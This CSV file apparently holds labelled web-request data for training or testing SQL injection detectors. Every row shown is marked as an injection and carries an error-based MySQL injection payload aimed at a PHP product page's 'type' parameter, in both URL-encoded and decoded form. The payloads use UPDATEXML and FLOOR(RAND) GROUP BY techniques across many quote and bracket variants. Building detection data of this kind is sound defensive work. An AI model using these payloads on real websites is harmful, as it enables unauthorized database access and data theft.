full_url,parsed_url,hostname,event_time,sql_keyword,params_length,request_volume,special_chars,values_to_length,injection
/details.php?prod=5&type=%3F%22%29%20OR%20UPDATEXML%284790%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%284790%3D4790%2C1%29%29%29%2C0x717a626271%29%2C9544%29%20AND%20%28%22wZSx%22%20LIKE%20%22wZSx,"/details.php?prod=5&type=?"") OR UPDATEXML(4790,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(4790=4790,1))),0x717a626271),9544) AND (""wZSx"" LIKE ""wZSx",192.168.43.6,1681395138.600602,5,118,93.6,5,8.474576271186441,1
/details.php?prod=5&type=%3F%22%29%29%20OR%20UPDATEXML%284790%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%284790%3D4790%2C1%29%29%29%2C0x717a626271%29%2C9544%29%20AND%20%28%28%22cPiU%22%20LIKE%20%22cPiU,"/details.php?prod=5&type=?"")) OR UPDATEXML(4790,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(4790=4790,1))),0x717a626271),9544) AND ((""cPiU"" LIKE ""cPiU",192.168.43.6,1681395138.604853,5,120,93.6,5,8.333333333333334,1
/details.php?prod=5&type=%3F%22%29%29%29%20OR%20UPDATEXML%284790%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%284790%3D4790%2C1%29%29%29%2C0x717a626271%29%2C9544%29%20AND%20%28%28%28%22poKg%22%20LIKE%20%22poKg,"/details.php?prod=5&type=?""))) OR UPDATEXML(4790,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(4790=4790,1))),0x717a626271),9544) AND (((""poKg"" LIKE ""poKg",192.168.43.6,1681395138.610127,5,122,93.6,5,8.19672131147541,1
/details.php?prod=5&type=%3F%22%20OR%20UPDATEXML%284790%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%284790%3D4790%2C1%29%29%29%2C0x717a626271%29%2C9544%29%20AND%20%22eNsK%22%20LIKE%20%22eNsK,"/details.php?prod=5&type=?"" OR UPDATEXML(4790,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(4790=4790,1))),0x717a626271),9544) AND ""eNsK"" LIKE ""eNsK",192.168.43.6,1681395138.615082,5,116,93.6,5,8.620689655172415,1
/details.php?prod=5&type=%3F%20OR%20UPDATEXML%284790%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%284790%3D4790%2C1%29%29%29%2C0x717a626271%29%2C9544%29--%20OVjb,"/details.php?prod=5&type=? OR UPDATEXML(4790,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(4790=4790,1))),0x717a626271),9544)-- OVjb",192.168.43.6,1681395138.620232,3,100,93.6,5,8.0,1
/details.php?prod=5&type=%3F%20OR%20UPDATEXML%284790%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%284790%3D4790%2C1%29%29%29%2C0x717a626271%29%2C9544%29%23%20wyHP,"/details.php?prod=5&type=? OR UPDATEXML(4790,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(4790=4790,1))),0x717a626271),9544)# wyHP",192.168.43.6,1681395138.625003,3,99,93.6,5,8.080808080808081,1
/details.php?prod=5&type=%3F%27%20OR%20UPDATEXML%284790%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%284790%3D4790%2C1%29%29%29%2C0x717a626271%29%2C9544%29%20OR%20%27rHnH%27%3D%27YLHk,"/details.php?prod=5&type=?' OR UPDATEXML(4790,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(4790=4790,1))),0x717a626271),9544) OR 'rHnH'='YLHk",192.168.43.6,1681395138.629795,3,110,93.6,5,7.2727272727272725,1
/details.php?prod=5&type=%3F%27%29%20WHERE%203188%3D3188%20OR%20UPDATEXML%284790%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%284790%3D4790%2C1%29%29%29%2C0x717a626271%29%2C9544%29--%20bxgA,"/details.php?prod=5&type=?') WHERE 3188=3188 OR UPDATEXML(4790,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(4790=4790,1))),0x717a626271),9544)-- bxgA",192.168.43.6,1681395138.63488,4,118,93.6,6,8.474576271186441,1
/details.php?prod=5&type=%3F%22%29%20WHERE%204432%3D4432%20OR%20UPDATEXML%284790%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%284790%3D4790%2C1%29%29%29%2C0x717a626271%29%2C9544%29--%20MnOv,"/details.php?prod=5&type=?"") WHERE 4432=4432 OR UPDATEXML(4790,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(4790=4790,1))),0x717a626271),9544)-- MnOv",192.168.43.6,1681395138.639136,4,118,93.6,6,8.474576271186441,1
/details.php?prod=5&type=%3F%29%20WHERE%208812%3D8812%20OR%20UPDATEXML%284790%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%284790%3D4790%2C1%29%29%29%2C0x717a626271%29%2C9544%29--%20FvTT,"/details.php?prod=5&type=?) WHERE 8812=8812 OR UPDATEXML(4790,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(4790=4790,1))),0x717a626271),9544)-- FvTT",192.168.43.6,1681395138.645298,4,117,93.6,5,7.6923076923076925,1
/details.php?prod=5&type=%3F%27%20WHERE%209236%3D9236%20OR%20UPDATEXML%284790%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%284790%3D4790%2C1%29%29%29%2C0x717a626271%29%2C9544%29--%20lHan,"/details.php?prod=5&type=?' WHERE 9236=9236 OR UPDATEXML(4790,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(4790=4790,1))),0x717a626271),9544)-- lHan",192.168.43.6,1681395138.649787,4,117,93.6,6,8.547008547008547,1
/details.php?prod=5&type=%3F%22%20WHERE%209779%3D9779%20OR%20UPDATEXML%284790%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%284790%3D4790%2C1%29%29%29%2C0x717a626271%29%2C9544%29--%20BkHG,"/details.php?prod=5&type=?"" WHERE 9779=9779 OR UPDATEXML(4790,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(4790=4790,1))),0x717a626271),9544)-- BkHG",192.168.43.6,1681395138.654511,4,117,93.6,6,8.547008547008547,1
/details.php?prod=5&type=%3F%20WHERE%201092%3D1092%20OR%20UPDATEXML%284790%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%284790%3D4790%2C1%29%29%29%2C0x717a626271%29%2C9544%29--%20zvza,"/details.php?prod=5&type=? WHERE 1092=1092 OR UPDATEXML(4790,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(4790=4790,1))),0x717a626271),9544)-- zvza",192.168.43.6,1681395138.659169,4,116,93.6,5,7.758620689655173,1
/details.php?prod=5&type=%3F%27%7C%7C%28SELECT%200x444b5761%20WHERE%202242%3D2242%20OR%20UPDATEXML%284790%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%284790%3D4790%2C1%29%29%29%2C0x717a626271%29%2C9544%29%29%7C%7C%27,"/details.php?prod=5&type=?'||(SELECT 0x444b5761 WHERE 2242=2242 OR UPDATEXML(4790,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(4790=4790,1))),0x717a626271),9544))||'",192.168.43.6,1681395138.663595,4,134,93.6,5,6.7164179104477615,1
/details.php?prod=5&type=%3F%27%7C%7C%28SELECT%200x75736978%20FROM%20DUAL%20WHERE%201286%3D1286%20OR%20UPDATEXML%284790%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%284790%3D4790%2C1%29%29%29%2C0x717a626271%29%2C9544%29%29%7C%7C%27,"/details.php?prod=5&type=?'||(SELECT 0x75736978 FROM DUAL WHERE 1286=1286 OR UPDATEXML(4790,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(4790=4790,1))),0x717a626271),9544))||'",192.168.43.6,1681395138.668327,5,144,93.6,5,6.944444444444445,1
/details.php?prod=5&type=%3F%27%2B%28SELECT%200x53566662%20WHERE%201685%3D1685%20OR%20UPDATEXML%284790%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%284790%3D4790%2C1%29%29%29%2C0x717a626271%29%2C9544%29%29%2B%27,"/details.php?prod=5&type=?'+(SELECT 0x53566662 WHERE 1685=1685 OR UPDATEXML(4790,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(4790=4790,1))),0x717a626271),9544))+'",192.168.43.6,1681395138.673242,4,132,93.6,5,6.818181818181818,1
/details.php?prod=5&type=%3F%7C%7C%28SELECT%200x56755053%20FROM%20DUAL%20WHERE%205941%3D5941%20OR%20UPDATEXML%284790%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%284790%3D4790%2C1%29%29%29%2C0x717a626271%29%2C9544%29%29%7C%7C,"/details.php?prod=5&type=?||(SELECT 0x56755053 FROM DUAL WHERE 5941=5941 OR UPDATEXML(4790,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(4790=4790,1))),0x717a626271),9544))||",192.168.43.6,1681395138.677551,5,142,93.6,4,6.338028169014085,1
/details.php?prod=5&type=%3F%7C%7C%28SELECT%200x5476424b%20WHERE%202040%3D2040%20OR%20UPDATEXML%284790%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%284790%3D4790%2C1%29%29%29%2C0x717a626271%29%2C9544%29%29%7C%7C,"/details.php?prod=5&type=?||(SELECT 0x5476424b WHERE 2040=2040 OR UPDATEXML(4790,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(4790=4790,1))),0x717a626271),9544))||",192.168.43.6,1681395138.682851,4,132,93.6,4,6.0606060606060606,1
/details.php?prod=5&type=%3F%2B%28SELECT%20PUKi%20WHERE%208602%3D8602%20OR%20UPDATEXML%284790%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%284790%3D4790%2C1%29%29%29%2C0x717a626271%29%2C9544%29%29%2B,"/details.php?prod=5&type=?+(SELECT PUKi WHERE 8602=8602 OR UPDATEXML(4790,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(4790=4790,1))),0x717a626271),9544))+",192.168.43.6,1681395138.687297,4,124,93.6,4,6.451612903225806,1
/details.php?prod=5&type=%3F%2B%28SELECT%200x76597454%20WHERE%203682%3D3682%20OR%20UPDATEXML%284790%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%284790%3D4790%2C1%29%29%29%2C0x717a626271%29%2C9544%29%29%2B,"/details.php?prod=5&type=?+(SELECT 0x76597454 WHERE 3682=3682 OR UPDATEXML(4790,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(4790=4790,1))),0x717a626271),9544))+",192.168.43.6,1681395138.692121,4,130,93.6,4,6.153846153846154,1
/details.php?prod=5&type=%3F%27%29%29%20AS%20iRWo%20WHERE%201606%3D1606%20OR%20UPDATEXML%284790%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%284790%3D4790%2C1%29%29%29%2C0x717a626271%29%2C9544%29--%20EPpW,"/details.php?prod=5&type=?')) AS iRWo WHERE 1606=1606 OR UPDATEXML(4790,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(4790=4790,1))),0x717a626271),9544)-- EPpW",192.168.43.6,1681395138.69664,5,127,93.6,6,8.661417322834646,1
/details.php?prod=5&type=%3F%22%29%29%20AS%20EYsz%20WHERE%201880%3D1880%20OR%20UPDATEXML%284790%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%284790%3D4790%2C1%29%29%29%2C0x717a626271%29%2C9544%29--%20iihf,"/details.php?prod=5&type=?"")) AS EYsz WHERE 1880=1880 OR UPDATEXML(4790,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(4790=4790,1))),0x717a626271),9544)-- iihf",192.168.43.6,1681395138.700837,5,127,93.6,6,8.661417322834646,1
/details.php?prod=5&type=%3F%29%29%20AS%20fjfK%20WHERE%202661%3D2661%20OR%20UPDATEXML%284790%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%284790%3D4790%2C1%29%29%29%2C0x717a626271%29%2C9544%29--%20eeNl,"/details.php?prod=5&type=?)) AS fjfK WHERE 2661=2661 OR UPDATEXML(4790,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(4790=4790,1))),0x717a626271),9544)-- eeNl",192.168.43.6,1681395138.705435,5,126,93.6,5,7.936507936507937,1
/details.php?prod=5&type=%3F%27%29%20AS%20xgpA%20WHERE%201614%3D1614%20OR%20UPDATEXML%284790%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%284790%3D4790%2C1%29%29%29%2C0x717a626271%29%2C9544%29--%20zeYo,"/details.php?prod=5&type=?') AS xgpA WHERE 1614=1614 OR UPDATEXML(4790,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(4790=4790,1))),0x717a626271),9544)-- zeYo",192.168.43.6,1681395138.710026,5,126,93.6,6,8.73015873015873,1
/details.php?prod=5&type=%3F%22%29%20AS%20BfPP%20WHERE%205595%3D5595%20OR%20UPDATEXML%284790%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%284790%3D4790%2C1%29%29%29%2C0x717a626271%29%2C9544%29--%20mAsy,"/details.php?prod=5&type=?"") AS BfPP WHERE 5595=5595 OR UPDATEXML(4790,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(4790=4790,1))),0x717a626271),9544)-- mAsy",192.168.43.6,1681395138.71434,5,126,93.6,6,8.73015873015873,1
/details.php?prod=5&type=%3F%29%20AS%20PuBf%20WHERE%203316%3D3316%20OR%20UPDATEXML%284790%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%284790%3D4790%2C1%29%29%29%2C0x717a626271%29%2C9544%29--%20JPNH,"/details.php?prod=5&type=?) AS PuBf WHERE 3316=3316 OR UPDATEXML(4790,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(4790=4790,1))),0x717a626271),9544)-- JPNH",192.168.43.6,1681395138.718965,5,125,93.6,5,8.0,1
/details.php?prod=5&type=%3F%60%20WHERE%203426%3D3426%20OR%20UPDATEXML%284790%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%284790%3D4790%2C1%29%29%29%2C0x717a626271%29%2C9544%29--%20geNW,"/details.php?prod=5&type=?` WHERE 3426=3426 OR UPDATEXML(4790,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(4790=4790,1))),0x717a626271),9544)-- geNW",192.168.43.6,1681395138.723402,4,117,93.6,5,7.6923076923076925,1
/details.php?prod=5&type=%3F%60%29%20WHERE%203000%3D3000%20OR%20UPDATEXML%284790%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%284790%3D4790%2C1%29%29%29%2C0x717a626271%29%2C9544%29--%20hZzw,"/details.php?prod=5&type=?`) WHERE 3000=3000 OR UPDATEXML(4790,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(4790=4790,1))),0x717a626271),9544)-- hZzw",192.168.43.6,1681395138.728021,4,118,93.6,5,7.627118644067797,1
/details.php?prod=5&type=%3F%60%3D%60%3F%60%20OR%20UPDATEXML%284790%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%284790%3D4790%2C1%29%29%29%2C0x717a626271%29%2C9544%29%20AND%20%60%3F%60%3D%60%3F,"/details.php?prod=5&type=?`=`?` OR UPDATEXML(4790,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(4790=4790,1))),0x717a626271),9544) AND `?`=`?",192.168.43.6,1681395138.732563,4,109,93.6,4,7.339449541284404,1
/details.php?prod=5&type=%3F%22%3D%22%3F%22%20OR%20UPDATEXML%284790%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%284790%3D4790%2C1%29%29%29%2C0x717a626271%29%2C9544%29%20AND%20%22%3F%22%3D%22%3F,"/details.php?prod=5&type=?""=""?"" OR UPDATEXML(4790,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(4790=4790,1))),0x717a626271),9544) AND ""?""=""?",192.168.43.6,1681395138.737642,4,109,93.6,5,8.256880733944953,1
/details.php?prod=5&type=%3F%5D-%28SELECT%200%20WHERE%203871%3D3871%20OR%20UPDATEXML%284790%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%284790%3D4790%2C1%29%29%29%2C0x717a626271%29%2C9544%29%29%7C%5B%3F,"/details.php?prod=5&type=?]-(SELECT 0 WHERE 3871=3871 OR UPDATEXML(4790,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(4790=4790,1))),0x717a626271),9544))|[?",192.168.43.6,1681395138.742377,4,124,93.6,4,6.451612903225806,1
/details.php?prod=5&type=%3F%27%20IN%20BOOLEAN%20MODE%29%20OR%20UPDATEXML%284790%2CCONCAT%280x2e%2C0x71717a6271%2C%28SELECT%20%28ELT%284790%3D4790%2C1%29%29%29%2C0x717a626271%29%2C9544%29%23,"/details.php?prod=5&type=?' IN BOOLEAN MODE) OR UPDATEXML(4790,CONCAT(0x2e,0x71717a6271,(SELECT (ELT(4790=4790,1))),0x717a626271),9544)#",192.168.43.6,1681395138.746575,4,112,93.6,6,8.928571428571429,1
/details.php?prod=5&type=%3F%29%20AND%20ROW%281400%2C5629%29%3E%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x71717a6271%2C%28SELECT%20%28ELT%281400%3D1400%2C1%29%29%29%2C0x717a626271%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20%28SELECT%204348%20UNION%20SELECT%201218%20UNION%20SELECT%209869%20UNION%20SELECT%207182%29a%20GROUP%20BY%20x%29--%20oeHC,"/details.php?prod=5&type=?) AND ROW(1400,5629)>(SELECT COUNT(*),CONCAT(0x71717a6271,(SELECT (ELT(1400=1400,1))),0x717a626271,FLOOR(RAND(0)*2))x FROM (SELECT 4348 UNION SELECT 1218 UNION SELECT 9869 UNION SELECT 7182)a GROUP BY x)-- oeHC",192.168.43.6,1681395138.751735,6,212,93.6,5,5.188679245283019,1
/details.php?prod=5&type=%3F%27%29%20AND%20ROW%281400%2C5629%29%3E%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x71717a6271%2C%28SELECT%20%28ELT%281400%3D1400%2C1%29%29%29%2C0x717a626271%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20%28SELECT%204348%20UNION%20SELECT%201218%20UNION%20SELECT%209869%20UNION%20SELECT%207182%29a%20GROUP%20BY%20x%29--%20Csqf,"/details.php?prod=5&type=?') AND ROW(1400,5629)>(SELECT COUNT(*),CONCAT(0x71717a6271,(SELECT (ELT(1400=1400,1))),0x717a626271,FLOOR(RAND(0)*2))x FROM (SELECT 4348 UNION SELECT 1218 UNION SELECT 9869 UNION SELECT 7182)a GROUP BY x)-- Csqf",192.168.43.6,1681395138.756461,6,213,93.6,6,5.633802816901408,1
/details.php?prod=5&type=%3F%27%20AND%20ROW%281400%2C5629%29%3E%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x71717a6271%2C%28SELECT%20%28ELT%281400%3D1400%2C1%29%29%29%2C0x717a626271%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20%28SELECT%204348%20UNION%20SELECT%201218%20UNION%20SELECT%209869%20UNION%20SELECT%207182%29a%20GROUP%20BY%20x%29--%20bXaI,"/details.php?prod=5&type=?' AND ROW(1400,5629)>(SELECT COUNT(*),CONCAT(0x71717a6271,(SELECT (ELT(1400=1400,1))),0x717a626271,FLOOR(RAND(0)*2))x FROM (SELECT 4348 UNION SELECT 1218 UNION SELECT 9869 UNION SELECT 7182)a GROUP BY x)-- bXaI",192.168.43.6,1681395138.760475,6,212,93.6,6,5.660377358490566,1
/details.php?prod=5&type=%3F%22%20AND%20ROW%281400%2C5629%29%3E%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x71717a6271%2C%28SELECT%20%28ELT%281400%3D1400%2C1%29%29%29%2C0x717a626271%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20%28SELECT%204348%20UNION%20SELECT%201218%20UNION%20SELECT%209869%20UNION%20SELECT%207182%29a%20GROUP%20BY%20x%29--%20ZNHW,"/details.php?prod=5&type=?"" AND ROW(1400,5629)>(SELECT COUNT(*),CONCAT(0x71717a6271,(SELECT (ELT(1400=1400,1))),0x717a626271,FLOOR(RAND(0)*2))x FROM (SELECT 4348 UNION SELECT 1218 UNION SELECT 9869 UNION SELECT 7182)a GROUP BY x)-- ZNHW",192.168.43.6,1681395138.765586,6,212,93.6,6,5.660377358490566,1
/details.php?prod=5&type=%3F%29%20AND%20ROW%281400%2C5629%29%3E%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x71717a6271%2C%28SELECT%20%28ELT%281400%3D1400%2C1%29%29%29%2C0x717a626271%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20%28SELECT%204348%20UNION%20SELECT%201218%20UNION%20SELECT%209869%20UNION%20SELECT%207182%29a%20GROUP%20BY%20x%29%20AND%20%282227%3D2227,"/details.php?prod=5&type=?) AND ROW(1400,5629)>(SELECT COUNT(*),CONCAT(0x71717a6271,(SELECT (ELT(1400=1400,1))),0x717a626271,FLOOR(RAND(0)*2))x FROM (SELECT 4348 UNION SELECT 1218 UNION SELECT 9869 UNION SELECT 7182)a GROUP BY x) AND (2227=2227",192.168.43.6,1681395138.770427,6,220,93.6,4,4.545454545454546,1
/details.php?prod=5&type=%3F%29%29%20AND%20ROW%281400%2C5629%29%3E%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x71717a6271%2C%28SELECT%20%28ELT%281400%3D1400%2C1%29%29%29%2C0x717a626271%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20%28SELECT%204348%20UNION%20SELECT%201218%20UNION%20SELECT%209869%20UNION%20SELECT%207182%29a%20GROUP%20BY%20x%29%20AND%20%28%287028%3D7028,"/details.php?prod=5&type=?)) AND ROW(1400,5629)>(SELECT COUNT(*),CONCAT(0x71717a6271,(SELECT (ELT(1400=1400,1))),0x717a626271,FLOOR(RAND(0)*2))x FROM (SELECT 4348 UNION SELECT 1218 UNION SELECT 9869 UNION SELECT 7182)a GROUP BY x) AND ((7028=7028",192.168.43.6,1681395138.786981,6,222,93.6,4,4.504504504504505,1
/details.php?prod=5&type=%3F%29%29%29%20AND%20ROW%281400%2C5629%29%3E%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x71717a6271%2C%28SELECT%20%28ELT%281400%3D1400%2C1%29%29%29%2C0x717a626271%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20%28SELECT%204348%20UNION%20SELECT%201218%20UNION%20SELECT%209869%20UNION%20SELECT%207182%29a%20GROUP%20BY%20x%29%20AND%20%28%28%286450%3D6450,"/details.php?prod=5&type=?))) AND ROW(1400,5629)>(SELECT COUNT(*),CONCAT(0x71717a6271,(SELECT (ELT(1400=1400,1))),0x717a626271,FLOOR(RAND(0)*2))x FROM (SELECT 4348 UNION SELECT 1218 UNION SELECT 9869 UNION SELECT 7182)a GROUP BY x) AND (((6450=6450",192.168.43.6,1681395138.875856,6,224,93.6,4,4.464285714285714,1
/details.php?prod=5&type=%3F%20AND%20ROW%281400%2C5629%29%3E%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x71717a6271%2C%28SELECT%20%28ELT%281400%3D1400%2C1%29%29%29%2C0x717a626271%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20%28SELECT%204348%20UNION%20SELECT%201218%20UNION%20SELECT%209869%20UNION%20SELECT%207182%29a%20GROUP%20BY%20x%29,"/details.php?prod=5&type=? AND ROW(1400,5629)>(SELECT COUNT(*),CONCAT(0x71717a6271,(SELECT (ELT(1400=1400,1))),0x717a626271,FLOOR(RAND(0)*2))x FROM (SELECT 4348 UNION SELECT 1218 UNION SELECT 9869 UNION SELECT 7182)a GROUP BY x)",192.168.43.6,1681395138.939629,6,204,93.6,4,4.901960784313726,1
/details.php?prod=5&type=%3F%27%29%20AND%20ROW%281400%2C5629%29%3E%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x71717a6271%2C%28SELECT%20%28ELT%281400%3D1400%2C1%29%29%29%2C0x717a626271%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20%28SELECT%204348%20UNION%20SELECT%201218%20UNION%20SELECT%209869%20UNION%20SELECT%207182%29a%20GROUP%20BY%20x%29%20AND%20%28%27MTyJ%27%3D%27MTyJ,"/details.php?prod=5&type=?') AND ROW(1400,5629)>(SELECT COUNT(*),CONCAT(0x71717a6271,(SELECT (ELT(1400=1400,1))),0x717a626271,FLOOR(RAND(0)*2))x FROM (SELECT 4348 UNION SELECT 1218 UNION SELECT 9869 UNION SELECT 7182)a GROUP BY x) AND ('MTyJ'='MTyJ",192.168.43.6,1681395138.946446,6,224,93.6,5,4.910714285714286,1
/details.php?prod=5&type=%3F%27%29%29%20AND%20ROW%281400%2C5629%29%3E%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x71717a6271%2C%28SELECT%20%28ELT%281400%3D1400%2C1%29%29%29%2C0x717a626271%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20%28SELECT%204348%20UNION%20SELECT%201218%20UNION%20SELECT%209869%20UNION%20SELECT%207182%29a%20GROUP%20BY%20x%29%20AND%20%28%28%27xgWl%27%3D%27xgWl,"/details.php?prod=5&type=?')) AND ROW(1400,5629)>(SELECT COUNT(*),CONCAT(0x71717a6271,(SELECT (ELT(1400=1400,1))),0x717a626271,FLOOR(RAND(0)*2))x FROM (SELECT 4348 UNION SELECT 1218 UNION SELECT 9869 UNION SELECT 7182)a GROUP BY x) AND (('xgWl'='xgWl",192.168.43.6,1681395139.015424,6,226,93.6,5,4.867256637168142,1
/details.php?prod=5&type=%3F%27%29%29%29%20AND%20ROW%281400%2C5629%29%3E%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x71717a6271%2C%28SELECT%20%28ELT%281400%3D1400%2C1%29%29%29%2C0x717a626271%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20%28SELECT%204348%20UNION%20SELECT%201218%20UNION%20SELECT%209869%20UNION%20SELECT%207182%29a%20GROUP%20BY%20x%29%20AND%20%28%28%28%27Sdip%27%3D%27Sdip,"/details.php?prod=5&type=?'))) AND ROW(1400,5629)>(SELECT COUNT(*),CONCAT(0x71717a6271,(SELECT (ELT(1400=1400,1))),0x717a626271,FLOOR(RAND(0)*2))x FROM (SELECT 4348 UNION SELECT 1218 UNION SELECT 9869 UNION SELECT 7182)a GROUP BY x) AND ((('Sdip'='Sdip",192.168.43.6,1681395139.020328,6,228,93.6,5,4.824561403508772,1
/details.php?prod=5&type=%3F%27%20AND%20ROW%281400%2C5629%29%3E%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x71717a6271%2C%28SELECT%20%28ELT%281400%3D1400%2C1%29%29%29%2C0x717a626271%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20%28SELECT%204348%20UNION%20SELECT%201218%20UNION%20SELECT%209869%20UNION%20SELECT%207182%29a%20GROUP%20BY%20x%29%20AND%20%27SYji%27%3D%27SYji,"/details.php?prod=5&type=?' AND ROW(1400,5629)>(SELECT COUNT(*),CONCAT(0x71717a6271,(SELECT (ELT(1400=1400,1))),0x717a626271,FLOOR(RAND(0)*2))x FROM (SELECT 4348 UNION SELECT 1218 UNION SELECT 9869 UNION SELECT 7182)a GROUP BY x) AND 'SYji'='SYji",192.168.43.6,1681395139.025632,6,222,93.6,5,4.954954954954955,1
